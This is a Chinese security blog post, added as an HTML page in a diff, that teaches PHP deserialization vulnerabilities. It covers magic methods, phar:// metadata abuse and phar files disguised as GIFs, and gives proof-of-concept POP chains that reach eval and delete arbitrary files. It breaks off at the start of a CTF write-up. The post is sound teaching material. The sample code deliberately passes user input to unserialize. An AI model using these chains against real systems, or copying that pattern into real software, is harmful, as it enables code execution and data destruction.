@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>PHP反序列化漏洞学习 - Lprvep</title><link rel="icon" type="image/png" href=icons/myicon.png /><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta property="og:title" content="PHP反序列化漏洞学习" />
+<meta property="og:description" content="PHP反序列化 简介 什么是序列化 序列化 (Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.lprvep.com/posts/php-serializa-learn/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-04-07T14:04:15&#43;08:00" />
+<meta property="article:modified_time" content="2021-04-07T14:04:15&#43;08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="PHP反序列化漏洞学习"/>
+<meta name="twitter:description" content="PHP反序列化 简介 什么是序列化 序列化 (Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。"/>
+<link href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,300italic,400italic|Raleway:200,300" rel="stylesheet">
+
+	<link rel="stylesheet" type="text/css" media="screen" href="https://www.lprvep.com/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://www.lprvep.com/css/main.css" />
+	<link rel="stylesheet" type="text/css" href="https://www.lprvep.com/css/custom.css" />
+	<link rel="stylesheet" type="text/css" href="https://www.lprvep.com/css/dark.css" media="(prefers-color-scheme: dark)" />
+	<link rel="stylesheet" type="text/css" href="https://www.lprvep.com/css/custom-dark.css" media="(prefers-color-scheme: dark)" />
+
+	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+	<script src="https://www.lprvep.com/js/main.js"></script>
+	<script src="https://www.lprvep.com/js/abc.js"></script>
+	<script src="https://www.lprvep.com/js/xyz.js"></script>
+	<script src="https://code.jquery.com/jquery-3.4.1.js"></script>
+</head>
+
+<body>
+	<div class="container wrapper post">
+		<div class="header">
+	<base href="https://www.lprvep.com/">
+	<h1 class="site-title"><a href="https://www.lprvep.com/">Lprvep</a></h1>
+	<div class="site-description"><h2>Web Security</h2><nav class="nav social">
+			<ul class="flat"><a href="https://github.com/godbless7" title="Github"><i data-feather="github"></i></a><a href="https://twitter.com/lprvep" title="Twitter"><i data-feather="twitter"></i></a><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></ul>
+		</nav>
+	</div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">All posts</a>
+			</li>
+			
+			<li>
+				<a href="/read">Read</a>
+			</li>
+			
+			<li>
+				<a href="/about">About</a>
+			</li>
+			
+			<li>
+				<a href="/tags">Tags</a>
+			</li>
+			
+			<li>
+				<a href="/avlist">Avlist</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post-header">
+			<h1 class="title">PHP反序列化漏洞学习</h1>
+			<div class="meta">Posted at &mdash; Apr 7, 2021</div>
+		</div>
+
+		<div class="markdown">
+			<h3 id="php反序列化">PHP反序列化</h3>
+<h4 id="简介">简介</h4>
+<h5 id="什么是序列化">什么是序列化</h5>
+<p>序列化 (Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。</p>
+<p>序列化:把对象转换成字节序列的过程称为对象的序列化
+反序列化:把字节序列恢复成对象的过程称为对象的反序列化</p>
+<p>反序列化的数据本质上来说是没有危害的,用户可控数据进行反序列化是存在危害的
+所以反序列化的危害，关键还是在于可控或不可控。</p>
+<h5 id="php中的魔术方法">PHP中的魔术方法</h5>
+<p>__construct()， __destruct()， __call()， __callStatic()， __get()， __set()， __isset()， __unset()， __sleep()， __wakeup()， __serialize(), __unserialize(), __toString()， __invoke()， __set_state()， __clone() 和 __debugInfo() 等方法在 PHP 中被称为魔术方法（Magic methods）。在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能。</p>
+<h6 id="__construct">__construct()</h6>
+<p>当一个对象创建时被调用</p>
+<h6 id="__destruct">__destruct()</h6>
+<p>当一个对象销毁时被调用</p>
+<h6 id="__call">__call</h6>
+<p>当调用一个对象中不能用的方法时就会执行该函数,如调用方法不存在时</p>
+<h6 id="__callstatic">__callStatic()</h6>
+<p>与__call方法相同,当创建静态方法来调用该类中不存在的方法时使用此函数</p>
+<h6 id="__get">__get()</h6>
+<p>获取一个类的成员变量时调用</p>
+<h6 id="__set">__set()</h6>
+<p>设置一个类的成员变量时调用</p>
+<h6 id="__isset">__isset()</h6>
+<p>当对不可访问属性调用isset()或者emptey()时,该方法会被调用
+如在类外部使用isset()查看类内的private变量时,会自动调用__isset()</p>
+<h6 id="__unset">__unset()</h6>
+<p>与__isset用法一致,当类外部使用unset()来删除private变量时,会自动调用__isset()</p>
+<h6 id="__sleep">__sleep()</h6>
+<p>在对象被序列化(serialize)之前运行</p>
+<h6 id="__wakeup">__wakeup()</h6>
+<p>在反序列化(unserialize)后立即调用</p>
+<h6 id="__serialize">__serialize()</h6>
+<p>serialize()函数会检查类中是否存在一个魔术方法 __serialize().如果存在,该方法将在任何序列化之前优先执行</p>
+<h6 id="__unserialize">__unserialize()</h6>
+<p>unserialize()函数会检查类中是否存在一个魔术方法__unserialize().如果存在,这个函数将被传递给__serialize()</p>
+<p>如果类中同时定义了__unserialize()和__wakeup()两个魔术方法,则只有__unserialize()方法会生效,__wakeup()方法会被忽略
+此特性自 PHP 7.4.0 起可用</p>
+<h6 id="__tostring">__toString()</h6>
+<p>当一个对象被当作一个字符串使用</p>
+<h6 id="__invoke">__invoke()</h6>
+<p>调用函数的方式调用一个对象时的回应方法</p>
+<h6 id="__set_state">__set_state()</h6>
+<p>调用var_export()导出类时,此静态方法会被调用</p>
+<h6 id="__clone">__clone()</h6>
+<p>当对象复制完成时调用</p>
+<h6 id="__debuginfo">__debugInfo()</h6>
+<p>打印所需调试信息</p>
+<h4 id="序列化与反序列化">序列化与反序列化</h4>
+<h5 id="serialize">serialize()</h5>
+<p>serialize()返回字符串,此字符串包含了表示value的字节流,可以存储于任何地方.
+有利于储存和传递php的值,同时不丢失其类型与结构.</p>
+<p>demo</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">&lt;?</span>php
+<span style="color:#719e07">class</span> <span style="color:#268bd2">test</span>{
+	<span style="color:#719e07">var</span> <span style="color:#268bd2">$lprvep</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;hello&#39;</span>;
+	<span style="color:#719e07">var</span> <span style="color:#268bd2">$php</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">123</span>;
+}
+
+<span style="color:#268bd2">$a</span> <span style="color:#719e07">=</span> <span style="color:#719e07">new</span> test;
+<span style="color:#268bd2">$a_ser</span> <span style="color:#719e07">=</span> serialize(<span style="color:#268bd2">$a</span>);
+print_r(<span style="color:#268bd2">$a_ser</span>);
+<span style="color:#719e07">?&gt;</span>
+</code></pre></div><p>把对象实例化后,通过serialize吧这个对象转换成字符串,输出如下</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">O:4:<span style="color:#2aa198">&#34;test&#34;</span>:2:<span style="color:#719e07">{</span>s:6:<span style="color:#2aa198">&#34;lprvep&#34;</span>;s:5:<span style="color:#2aa198">&#34;hello&#34;</span>;s:3:<span style="color:#2aa198">&#34;php&#34;</span>;i:123;<span style="color:#719e07">}</span>
+</code></pre></div><p>O:4:&ldquo;test&rdquo;:2    存储的对象名称长度为4,叫test,总共有两个值
+括号内的s为字符串的缩写,i为整数的缩写,数字代表了长度</p>
+<h5 id="unserialize">unserialize()</h5>
+<p>当使用了serialize,想要把字符串恢复,就要使用unserialize()</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">&lt;?</span>php
+<span style="color:#719e07">class</span> <span style="color:#268bd2">test</span>{
+	<span style="color:#719e07">var</span> <span style="color:#268bd2">$lprvep</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;hello&#39;</span>;
+	<span style="color:#719e07">var</span> <span style="color:#268bd2">$php</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">123</span>;
+}
+
+<span style="color:#268bd2">$a</span> <span style="color:#719e07">=</span> <span style="color:#719e07">new</span> test;
+<span style="color:#268bd2">$a_ser</span> <span style="color:#719e07">=</span> serialize(<span style="color:#268bd2">$a</span>);
+print_r(<span style="color:#268bd2">$a_ser</span>);
+<span style="color:#268bd2">$a_unser</span> <span style="color:#719e07">=</span> unserialize(<span style="color:#268bd2">$a_ser</span>);
+print_r(<span style="color:#268bd2">$a_unser</span>);
+
+<span style="color:#719e07">?&gt;</span>
+</code></pre></div><p>使用unserialize后的样子</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">O:4:<span style="color:#2aa198">&#34;test&#34;</span>:2:<span style="color:#719e07">{</span>s:6:<span style="color:#2aa198">&#34;lprvep&#34;</span>;s:5:<span style="color:#2aa198">&#34;hello&#34;</span>;s:3:<span style="color:#2aa198">&#34;php&#34;</span>;i:123;<span style="color:#719e07">}</span>
+<span style="color:#b58900">test</span> Object <span style="color:#719e07">(</span> <span style="color:#719e07">[</span>lprvep<span style="color:#719e07">]</span> <span style="color:#719e07">=</span>&gt; hello <span style="color:#719e07">[</span>php<span style="color:#719e07">]</span> <span style="color:#719e07">=</span>&gt; <span style="color:#2aa198">123</span> <span style="color:#719e07">)</span>
+</code></pre></div><h4 id="特性">特性</h4>
+<h5 id="php属性访问权限">PHP属性访问权限</h5>
+<p>在对不同属性进行序列化时,会出现几种不同的情况,以下面的例子来示范</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">&lt;?</span>php
+<span style="color:#719e07">class</span> <span style="color:#268bd2">test</span>
+{
+    <span style="color:#719e07">private</span> <span style="color:#268bd2">$flag</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;Inactive&#39;</span>;
+    <span style="color:#719e07">protected</span> <span style="color:#268bd2">$test</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#34;test&#34;</span>;
+    <span style="color:#719e07">public</span> <span style="color:#268bd2">$test1</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#34;test1&#34;</span>;
+
+    <span style="color:#719e07">public</span> <span style="color:#719e07">function</span> <span style="color:#268bd2">set_flag</span>(<span style="color:#268bd2">$flag</span>)
+    {
+        <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>flag <span style="color:#719e07">=</span> <span style="color:#268bd2">$flag</span>;
+    }
+    <span style="color:#719e07">public</span> <span style="color:#719e07">function</span> <span style="color:#268bd2">get_flag</span>(<span style="color:#268bd2">$flag</span>)
+    {
+        <span style="color:#719e07">return</span> <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>flag;
+    }
+}
+
+<span style="color:#268bd2">$object</span> <span style="color:#719e07">=</span> <span style="color:#719e07">new</span> test();
+<span style="color:#268bd2">$object</span><span style="color:#719e07">-&gt;</span>set_flag(<span style="color:#2aa198">&#39;Active&#39;</span>);
+<span style="color:#268bd2">$data</span> <span style="color:#719e07">=</span> serialize(<span style="color:#268bd2">$object</span>);
+file_put_contents(<span style="color:#2aa198">&#34;serialize.txt&#34;</span>, <span style="color:#268bd2">$data</span>);
+</code></pre></div><p>脚本执行后生成的txt
+<img src="../images/php-serializa-learn/day2-3.png" alt=""></p>
+<h6 id="public">Public</h6>
+<p><img src="../images/php-serializa-learn/day2-4.png" alt="">
+公共的,原样输出</p>
+<h6 id="private">Private</h6>
+<p>可以看到这里多了个test,在test旁边多了两个空白符00
+<img src="../images/php-serializa-learn/day2-5.png" alt="">
+私有的,在序列化时会带上自己的类名在属性名之前,并且会在类名前后添加两个空白符
+即在对私有属性序列化时的格式为:<strong>%00类名%00属性名</strong></p>
+<h6 id="protected">Protected</h6>
+<p>这里这是两个空白符中间多了个*
+<img src="../images/php-serializa-learn/day2-6.png" alt="">
+受保护的,在序列化时,会在属性名之前加上:**%00*%00**
+即:**%00*%00属性名**</p>
+<h4 id="phar-拓展">phar 拓展</h4>
+<p>通常我们在利用反序列化漏洞的时候,只能将序列化后的字符串传入unserialize(),利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性,拓展了php反序列化漏洞的攻击面.</p>
+<p>该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下,配合<strong>phar://伪协议</strong>,
+可以<strong>不依赖unserialize</strong>直接进行反序列化操作.</p>
+<h5 id="phar文件结构">phar文件结构</h5>
+<p>phar文件总共分为四部分构成</p>
+<ol>
+<li>a stub
+类似于一个标志,格式为xxx<!-- raw HTML omitted -->,前面内容不限,但必须以__HALT_COMPILER();?&gt;来结尾,否则phar扩展将无法识别这个文件为phar文件.</li>
+<li>a manifest descrilbing the contens
+phar文件本质上是一种压缩文件,其中每个被压缩文件的权限、属性等信息都放在这部分.这部分还会以序列化的形式存储用户自定义的meta-data,这是上述攻击手法最核心的地方.</li>
+<li>the file contents
+被压缩文件的内容。</li>
+</ol>
+<h5 id="phar文件构建">phar文件构建</h5>
+<p>创建前提:php.ini中phar.readonly选项要设置为Off</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">&lt;?</span>php
+    <span style="color:#719e07">class</span> <span style="color:#268bd2">TestObject</span> {
+    }
+
+    <span style="color:#719e07">@</span>unlink(<span style="color:#2aa198">&#34;phar.phar&#34;</span>);
+    <span style="color:#268bd2">$phar</span> <span style="color:#719e07">=</span> <span style="color:#719e07">new</span> Phar(<span style="color:#2aa198">&#34;phar.phar&#34;</span>); <span style="color:#586e75">//后缀名必须为phar
+</span><span style="color:#586e75"></span>    <span style="color:#268bd2">$phar</span><span style="color:#719e07">-&gt;</span>startBuffering();
+    <span style="color:#268bd2">$phar</span><span style="color:#719e07">-&gt;</span>setStub(<span style="color:#2aa198">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span>); <span style="color:#586e75">//设置stub
+</span><span style="color:#586e75"></span>    <span style="color:#268bd2">$o</span> <span style="color:#719e07">=</span> <span style="color:#719e07">new</span> TestObject();
+    <span style="color:#268bd2">$phar</span><span style="color:#719e07">-&gt;</span>setMetadata(<span style="color:#268bd2">$o</span>); <span style="color:#586e75">//将自定义的meta-data存入manifest
+</span><span style="color:#586e75"></span>    <span style="color:#268bd2">$phar</span><span style="color:#719e07">-&gt;</span>addFromString(<span style="color:#2aa198">&#34;test.txt&#34;</span>, <span style="color:#2aa198">&#34;test&#34;</span>); <span style="color:#586e75">//添加要压缩的文件
+</span><span style="color:#586e75"></span>    <span style="color:#586e75">//签名自动计算
+</span><span style="color:#586e75"></span>    <span style="color:#268bd2">$phar</span><span style="color:#719e07">-&gt;</span>stopBuffering();
+<span style="color:#719e07">?&gt;</span>
+</code></pre></div><p>使用xxd命令查看phar文件,可以看到是以序列化形式存储的
+<img src="../images/php-serializa-learn/day2-8.png" alt="">
+构建个demo来看看</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">&lt;?</span>php 
+    <span style="color:#719e07">class</span> <span style="color:#268bd2">TestObject</span> {
+        <span style="color:#719e07">public</span> <span style="color:#719e07">function</span> __destruct() {
+            <span style="color:#719e07">echo</span> <span style="color:#2aa198">&#39;Destruct called&#39;</span>;
+        }
+    }
+
+    <span style="color:#268bd2">$filename</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;phar://phar.phar/test.txt&#39;</span>;
+    file_get_contents(<span style="color:#268bd2">$filename</span>); 
+<span style="color:#719e07">?&gt;</span>
+</code></pre></div><p>可以看到虽然上面这里的函数没有直接调用到TestObject这个类
+但经过了phar文件后,依然是执行了这个类里面的__destruct()
+<img src="../images/php-serializa-learn/day2-9.png" alt="">
+#####受影响的函数列表</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">受影响函数</th>
+<th style="text-align:center"></th>
+<th style="text-align:center"></th>
+<th style="text-align:center"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">fileatime</td>
+<td style="text-align:center">filectime</td>
+<td style="text-align:center">file_exists</td>
+<td style="text-align:center">file_get_contents</td>
+</tr>
+<tr>
+<td style="text-align:center">file_put_contents</td>
+<td style="text-align:center">file</td>
+<td style="text-align:center">filegroup</td>
+<td style="text-align:center">fopen</td>
+</tr>
+<tr>
+<td style="text-align:center">fileinode</td>
+<td style="text-align:center">filemtime</td>
+<td style="text-align:center">fileowner</td>
+<td style="text-align:center">fileperms</td>
+</tr>
+<tr>
+<td style="text-align:center">is_dir</td>
+<td style="text-align:center">is_executable</td>
+<td style="text-align:center">is_file</td>
+<td style="text-align:center">is_link</td>
+</tr>
+<tr>
+<td style="text-align:center">is_readable</td>
+<td style="text-align:center">is_writable</td>
+<td style="text-align:center">is_writeable</td>
+<td style="text-align:center">parse_ini_file</td>
+</tr>
+<tr>
+<td style="text-align:center">copy</td>
+<td style="text-align:center">unlink</td>
+<td style="text-align:center">stat</td>
+<td style="text-align:center">readfile</td>
+</tr>
+</tbody>
+</table>
+<h5 id="伪造phar成其他格式文件">伪造phar成其他格式文件</h5>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">&lt;?</span>php
+    <span style="color:#719e07">class</span> <span style="color:#268bd2">TestObject</span> {
+    }
+
+    <span style="color:#719e07">@</span>unlink(<span style="color:#2aa198">&#34;phar.phar&#34;</span>);
+    <span style="color:#268bd2">$phar</span> <span style="color:#719e07">=</span> <span style="color:#719e07">new</span> Phar(<span style="color:#2aa198">&#34;phar.phar&#34;</span>); 
+    <span style="color:#268bd2">$phar</span><span style="color:#719e07">-&gt;</span>startBuffering();
+    <span style="color:#268bd2">$phar</span><span style="color:#719e07">-&gt;</span>setStub(<span style="color:#2aa198">&#34;GIF89a&#34;</span><span style="color:#719e07">.</span><span style="color:#2aa198">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span>); 
+    <span style="color:#268bd2">$o</span> <span style="color:#719e07">=</span> <span style="color:#719e07">new</span> TestObject();
+    <span style="color:#268bd2">$phar</span><span style="color:#719e07">-&gt;</span>setMetadata(<span style="color:#268bd2">$o</span>); 
+    <span style="color:#268bd2">$phar</span><span style="color:#719e07">-&gt;</span>addFromString(<span style="color:#2aa198">&#34;test.txt&#34;</span>, <span style="color:#2aa198">&#34;test&#34;</span>); 
+    <span style="color:#268bd2">$phar</span><span style="color:#719e07">-&gt;</span>stopBuffering();
+<span style="color:#719e07">?&gt;</span>
+</code></pre></div><p>上面中的代码可以看到加入了个GIF的头,识别就会将其为GIF图片
+<img src="../images/php-serializa-learn/day2-10.png" alt=""></p>
+<h4 id="案例">案例</h4>
+<h5 id="简单的命令执行">简单的命令执行</h5>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">&lt;?</span>php
+<span style="color:#719e07">class</span> <span style="color:#268bd2">Lprvep</span> {
+    <span style="color:#719e07">private</span> <span style="color:#268bd2">$test</span>;
+    <span style="color:#719e07">public</span> <span style="color:#268bd2">$Lprvep</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#34;Hello,lprvep&#34;</span>;
+    <span style="color:#719e07">function</span> __construct() {
+        <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>test <span style="color:#719e07">=</span> <span style="color:#719e07">new</span> L();
+    }
+    
+    <span style="color:#719e07">function</span> __destruct() {
+        <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>test<span style="color:#719e07">-&gt;</span>action();
+    }
+}
+
+<span style="color:#719e07">class</span> <span style="color:#268bd2">L</span> {
+    <span style="color:#719e07">function</span> <span style="color:#268bd2">action</span>() {
+        <span style="color:#719e07">echo</span> <span style="color:#2aa198">&#34;Hello world !&#34;</span>;
+    }
+}
+
+<span style="color:#719e07">class</span> <span style="color:#268bd2">Evil</span> {
+
+    <span style="color:#719e07">var</span> <span style="color:#268bd2">$test2</span>;
+    <span style="color:#719e07">function</span> <span style="color:#268bd2">action</span>() {
+        <span style="color:#719e07">eval</span>(<span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>test2);
+    }
+}
+
+unserialize(<span style="color:#268bd2">$_GET</span>[<span style="color:#2aa198">&#39;test&#39;</span>]);
+</code></pre></div><p>这段代码中,我们可以控制的只有unserialize($_GET[&lsquo;test&rsquo;]);,所以我们只能从这里面入手</p>
+<ol>
+<li>类Lprvep中,只有两个函数,分别是构造函数和析构函数,一个创建时调用,一个销毁时调用</li>
+<li>类L中,有个action()函数,且函数功能只是一个echo</li>
+<li>类Evil中,也有个action()函数,但与L不同的是,这里使用的是eval,可以执行命令</li>
+</ol>
+<p>这时我们的思路:把类Lprvep中$this-&gt;test的属性改为Evil,类Evil中的test2改为我们想要操作的东西</p>
+<p>POC如下</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">&lt;?</span>php
+<span style="color:#719e07">class</span> <span style="color:#268bd2">Lprvep</span> {
+    <span style="color:#719e07">private</span> <span style="color:#268bd2">$test</span>;
+    <span style="color:#719e07">function</span> __construct() {
+        <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>test <span style="color:#719e07">=</span> <span style="color:#719e07">new</span> Evil();
+    }
+}
+
+<span style="color:#719e07">class</span> <span style="color:#268bd2">Evil</span> {
+    <span style="color:#719e07">var</span> <span style="color:#268bd2">$test2</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;phpinfo();&#39;</span>;
+}
+
+<span style="color:#268bd2">$a</span> <span style="color:#719e07">=</span> <span style="color:#719e07">new</span> Lprvep;
+<span style="color:#719e07">echo</span> urlencode(serialize(<span style="color:#268bd2">$a</span>));
+
+</code></pre></div><p>这里可以看到,因为$test为private属性,所有在序列化中,属性名是:<strong>%00类名%00属性名</strong>
+<img src="../images/php-serializa-learn/day2-7.png" alt=""></p>
+<h5 id="任意文件删除">任意文件删除</h5>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">&lt;?</span>php
+
+<span style="color:#719e07">class</span> <span style="color:#268bd2">Test1</span>{
+    <span style="color:#719e07">protected</span> <span style="color:#268bd2">$obj</span>;
+
+    <span style="color:#719e07">function</span> __construct(){
+
+        <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>obj <span style="color:#719e07">=</span> <span style="color:#719e07">new</span> Test3;
+
+    }
+
+    <span style="color:#719e07">function</span> __toString(){
+
+        <span style="color:#719e07">if</span> (isset(<span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>obj)) <span style="color:#719e07">return</span> <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>obj<span style="color:#719e07">-&gt;</span>Delete();
+
+    }
+
+}
+
+<span style="color:#719e07">class</span> <span style="color:#268bd2">Test2</span>{  
+    <span style="color:#719e07">public</span> <span style="color:#268bd2">$cache_file</span>;
+
+    <span style="color:#719e07">function</span> <span style="color:#268bd2">Delete</span>(){
+        <span style="color:#268bd2">$file</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#34;</span><span style="color:#2aa198">{</span><span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>cache_file<span style="color:#2aa198">}</span><span style="color:#2aa198">&#34;</span>;
+
+        <span style="color:#719e07">if</span> (file_exists(<span style="color:#268bd2">$file</span>)){
+
+            <span style="color:#719e07">@</span>unlink(<span style="color:#268bd2">$file</span>);
+        }
+
+        <span style="color:#719e07">return</span> <span style="color:#2aa198">&#39;I am a evil Delete function&#39;</span>;
+
+    }
+
+}
+
+<span style="color:#719e07">class</span> <span style="color:#268bd2">Test3</span>{
+
+    <span style="color:#719e07">function</span> <span style="color:#268bd2">Delete</span>(){
+
+        <span style="color:#719e07">return</span> <span style="color:#2aa198">&#39;I am a safe Delete function&#39;</span>;
+
+    }
+
+}
+
+<span style="color:#268bd2">$user_data</span> <span style="color:#719e07">=</span> unserialize(<span style="color:#268bd2">$_GET</span>[<span style="color:#2aa198">&#39;data&#39;</span>]);
+
+<span style="color:#719e07">echo</span> <span style="color:#268bd2">$user_data</span>;
+
+<span style="color:#719e07">?&gt;</span>
+</code></pre></div><p>通过阅读代码可得知,正常的执行流程为</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Test1类 -&gt; __construct -&gt; $this-&gt;obj = new Test3 -&gt; __toString() -&gt; $this-&gt;obj-&gt;Delete(); 
+</code></pre></div><p>这里的Delete()为Test3.Delete,此时的脚本并未有异常</p>
+<p>但是在Test2类中,存在着和Test3类中同名的函数Delete()函数
+并且在Test2中还执行可以执行删除文件的操作,这时就可以构造一个POP链来改变脚本的运行</p>
+<p>修改后的POP链</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Test1类 -&gt; __construct -&gt; $this-&gt;obj = new Test2 -&gt; __toString() -&gt; $this-&gt;Test2.Delete();
+</code></pre></div><p>POC如下</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">&lt;?</span>php
+
+<span style="color:#719e07">class</span> <span style="color:#268bd2">Test1</span>{
+    <span style="color:#719e07">protected</span> <span style="color:#268bd2">$obj</span>;
+    <span style="color:#719e07">function</span> __construct(){
+        <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>obj <span style="color:#719e07">=</span> <span style="color:#719e07">new</span> Test2;
+    }
+}
+
+<span style="color:#719e07">class</span> <span style="color:#268bd2">Test2</span>{  
+    <span style="color:#719e07">public</span> <span style="color:#268bd2">$cache_file</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;shell.txt&#39;</span>;
+}
+
+
+
+<span style="color:#268bd2">$evil</span> <span style="color:#719e07">=</span> <span style="color:#719e07">new</span> Test1;
+<span style="color:#719e07">echo</span> urlencode(serialize(<span style="color:#268bd2">$evil</span>));
+
+<span style="color:#719e07">?&gt;</span>
+</code></pre></div><p>此时该目录下存在shell.txt文件
+<img src="../images/php-serializa-learn/day2-1.png" alt="">
+使用poc构造出的序列化内容用data参数get过去,shell.txt文件被删除
+<img src="../images/php-serializa-learn/day2-2.png" alt=""></p>
+<h5 id="mrctf2020ezpop">[MRCTF2020]Ezpop</h5>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">&lt;?</span>php
+<span style="color:#586e75">//flag is in flag.php
+</span><span style="color:#586e75"></span>
+<span style="color:#719e07">class</span> <span style="color:#268bd2">Modifier</span> {
+    <span style="color:#719e07">protected</span>  <span style="color:#268bd2">$var</span>;
+    <span style="color:#719e07">public</span> <span style="color:#719e07">function</span> <span style="color:#268bd2">append</span>(<span style="color:#268bd2">$value</span>){
+        <span style="color:#719e07">include</span>(<span style="color:#268bd2">$value</span>);
+    }
+    <span style="color:#719e07">public</span> <span style="color:#719e07">function</span> __invoke(){
+        <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>append(<span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>var);
+    }
+}
+
+<span style="color:#719e07">class</span> <span style="color:#268bd2">Show</span>{
+    <span style="color:#719e07">public</span> <span style="color:#268bd2">$source</span>;
+    <span style="color:#719e07">public</span> <span style="color:#268bd2">$str</span>;
+    <span style="color:#719e07">public</span> <span style="color:#719e07">function</span> __construct(<span style="color:#268bd2">$file</span><span style="color:#719e07">=</span><span style="color:#2aa198">&#39;index.php&#39;</span>){
+        <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>source <span style="color:#719e07">=</span> <span style="color:#268bd2">$file</span>;
+        <span style="color:#719e07">echo</span> <span style="color:#2aa198">&#39;Welcome to &#39;</span><span style="color:#719e07">.</span><span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>source<span style="color:#719e07">.</span><span style="color:#2aa198">&#34;&lt;br&gt;&#34;</span>;
+    }
+    <span style="color:#719e07">public</span> <span style="color:#719e07">function</span> __toString(){
